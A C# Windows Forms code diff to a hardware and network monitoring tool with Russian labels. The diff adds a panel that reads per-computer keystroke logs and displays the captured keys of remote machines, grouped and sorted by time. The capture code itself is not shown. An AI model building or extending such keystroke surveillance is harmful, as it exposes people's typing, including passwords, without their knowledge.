@@ -25,6 +25,8 @@ namespace FormsAppHardware
         private Thread findPC;
         ManagementScope scope;
 
+        Dictionary<string, HashSet<KeyRecord>> enteredKeys = new Dictionary<string, HashSet<KeyRecord>>();
+
         public Form1()
         {
             InitializeComponent();
@@ -39,6 +41,8 @@ namespace FormsAppHardware
             comparer = new ListViewItemComparer();
             comparer.ColumnIndex = 0;
         }
+
+
 
         private void GetHardWareInfo(string key, ListView list)
         {
@@ -55,11 +59,11 @@ namespace FormsAppHardware
                     {
                         listViewGroup = list.Groups.Add(obj["Name"].ToString(), obj["Name"].ToString());
                     }
-                    catch (Exception) 
+                    catch (Exception)
                     {
                         listViewGroup = list.Groups.Add(obj.ToString(), obj.ToString());
                     }
-                    
+
                     if (obj.Properties.Count == 0)
                     {
                         MessageBox.Show("Не удалось получить информацию", "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Error);
@@ -86,10 +90,10 @@ namespace FormsAppHardware
                             {
                                 case "System.String[]":
                                     string[] stringData = data.Value as string[];
-                                    
+
                                     string resStr1 = string.Empty;
-                                    
-                                    foreach (string s in  stringData)
+
+                                    foreach (string s in stringData)
                                     {
                                         resStr1 += $"{s}";
                                     }
@@ -200,8 +204,8 @@ namespace FormsAppHardware
 
                     proc_list.Items.Add(item);
 
-                   
-                    
+
+
                 }
             }
             catch (Exception) { }
@@ -271,7 +275,7 @@ namespace FormsAppHardware
                         this.IP = ip.ToString();
                     }
                 }
-                
+
                 Invoke((MethodInvoker)delegate
                 {
                     ListViewItem item = new ListViewItem();
@@ -279,7 +283,7 @@ namespace FormsAppHardware
                     item.SubItems.Add(this.IP);
                     listViewConnect.Items.Add(item);
                 });
-                
+
                 string[] ipRange = IP.Split('.');
                 for (int i = 2; i < 255; i++)
                 {
@@ -363,11 +367,55 @@ namespace FormsAppHardware
         private void listViewConnect_MouseClick(object sender, MouseEventArgs e)
         {
             textBoxPC.Text = listViewConnect.SelectedItems[0].SubItems[0].Text;
+            enteredKeys.Clear();
+
+            updateKeysInfo(null, null);
+            timer1.Start();
         }
 
         private void textBoxLoginPas_TextChanged(object sender, EventArgs e)
         {
             buttonConnect.Enabled = textBoxLogin.Text.Length > 0 && textBoxPas.Text.Length > 0;
+        }
+
+        private void updateKeysInfo(object sender, EventArgs e)
+        {
+            string computerName = textBoxPC.Text;
+            string path = $"../../../../{computerName}/log.txt";
+            if (System.IO.File.Exists(path))
+            {
+                using (System.IO.StreamReader sr = new System.IO.StreamReader(path))
+                {
+                    for (string line = sr.ReadLine(); line != null; line = sr.ReadLine())
+                    {
+                        string[] tokens = line.Split(new char[] { '|' }, 3);
+                        var time = Convert.ToDateTime(tokens[0]);
+                        if (enteredKeys.ContainsKey(tokens[1]))
+                            enteredKeys[tokens[1]].Add(new KeyRecord(tokens[2], time));
+                        else
+                            enteredKeys.Add(tokens[1], new HashSet<KeyRecord>() { new KeyRecord(tokens[2], time) });
+                    }
+                }
+
+                textBox1.Text = "";
+                StringBuilder sb = new StringBuilder();
+
+                foreach (var kvp in enteredKeys)
+                {
+                    sb.Append($"{kvp.Key}:\n\t>>>>> ");
+                    foreach (var pressed in kvp.Value.OrderBy(k => k.Time))
+                        sb.Append(pressed.Key);
+                    sb.AppendLine("\n\n\n");
+                }
+                textBox1.Text = sb.ToString();
+                textBox1.ForeColor = Color.White;
+            }
+            else
+            {
+                textBox1.Text = "Компьютер не найден или для него не было создано логов.";
+                textBox1.ForeColor = Color.Red;
+            }
+
         }
 
         private void buttonConnect_Click(object sender, EventArgs e)
@@ -387,7 +435,7 @@ namespace FormsAppHardware
                     scope = new ManagementScope($"\\\\{textBoxPC.Text}\\root\\CIMV2", options);
                     scope.Connect();
                 }
-                
+
                 labelStatusConnect.ForeColor = Color.Green;
                 labelStatusConnect.Text = "Подключение установлено";
                 listViewСharacteristic.Items.Clear();
@@ -400,6 +448,28 @@ namespace FormsAppHardware
             }
         }
 
-        
+
+    }
+
+    internal class KeyRecord
+    {
+        public string Key { get; set; }
+        public DateTime Time { get; set; }
+
+        public override int GetHashCode()
+        {
+            return Time.GetHashCode();
+        }
+
+        public override bool Equals(object obj)
+        {
+            return obj is KeyRecord r && r.Key == Key && r.Time == Time;
+        }
+
+        public KeyRecord(string key, DateTime time)
+        {
+            Key = key;
+            Time = time;
+        }
     }
 }
